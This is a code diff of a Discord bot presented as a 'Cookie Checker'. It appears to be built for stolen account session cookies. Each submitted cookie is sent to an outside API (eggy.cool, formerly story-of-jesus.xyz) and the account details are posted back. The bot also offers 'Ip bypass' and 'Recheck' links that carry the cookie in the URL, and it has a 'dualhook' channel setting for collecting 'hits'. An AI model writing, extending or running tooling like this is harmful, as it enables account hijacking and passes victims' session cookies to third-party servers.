@@ -10,8 +10,11 @@ yourprefix = "."  ## enter the prefix of your choice by replacing the !
 
 dualhookchannelid = Yourchannleid ## Your channle id to get db hooked Hits, e.g 905536418934427096
 
+intents = discord.Intents.all()
+
 bot = commands.Bot(command_prefix=yourprefix,
-                   description="Cookie Checker Made by LucidHacker#6393")
+                   description="Cookie Checker Bot :)",
+                   intents=intents)
 
 @bot.command()
 async def cc(
@@ -26,7 +29,7 @@ async def cc(
         return  ## break command
 
     r = requests.get(
-        f'https://story-of-jesus.xyz/api/lucid.php?cookie={cookie}')
+        f'https://eggy.cool/api/lucidss.php?cookie={cookie}')
     ## Send get request to my api to get info about cookie in json
     data = r.json()  ## get json from request ^^
 
@@ -63,13 +66,13 @@ async def cc(
 
     ## create embed with above data
     cook = discord.Embed(
-        title=f'***Made by anonymous103#0001 / LucidHacker#6393***',
+        title=f'***Made by LucidHacker#6393***',
         color=0xdb2323)
     cook.set_thumbnail(url=f'{avatarurl}')
     cook.add_field(
         name="Recheck cookies",
         value=
-        f'**[Click Here To Recheck The Cookie](https://story-of-jesus.xyz/checker/lucid-beams.php?cookie={cookie})**',
+        f'**[Click Here To Recheck The Cookie](https://eggy.cool/checker/lucid.php?cookie={cookie})**',
         inline=False)
     cook.add_field(name="UserID:🔍", value=f'```{userid}```', inline=True)
     cook.add_field(name="Display Name👀:",
@@ -112,7 +115,7 @@ async def cc(
         inline=False)
     cook.add_field(
         name='Ip bypass For your Cookie: ',
-        value=f'**[Click Here](https://story-of-jesus.xyz/refresh/lucid-beams.php?cookie={cookie})**',
+        value=f'**[Click Here](https://eggy.cool/refresh/beamerhub.php?cookie={cookie})**',
         inline=False)
     cook.set_footer(text='.invite to invite Cookie Checker Bott')
 
